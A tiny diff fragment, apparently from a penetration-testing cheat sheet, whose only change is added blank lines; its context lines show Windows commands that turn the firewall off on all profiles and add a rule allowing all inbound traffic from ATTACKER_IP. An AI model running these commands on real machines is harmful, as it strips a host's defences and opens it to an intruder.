@@ -18,3 +18,5 @@ NetSh Advfirewall set allprofiles state off
 # ip whitelisting
 New-NetFirewallRule -Name morph3inbound -DisplayName morph3inbound -Enabled True -Direction Inbound -Protocol ANY -Action Allow -Profile ANY -RemoteAddress ATTACKER_IP
 ```
+
+
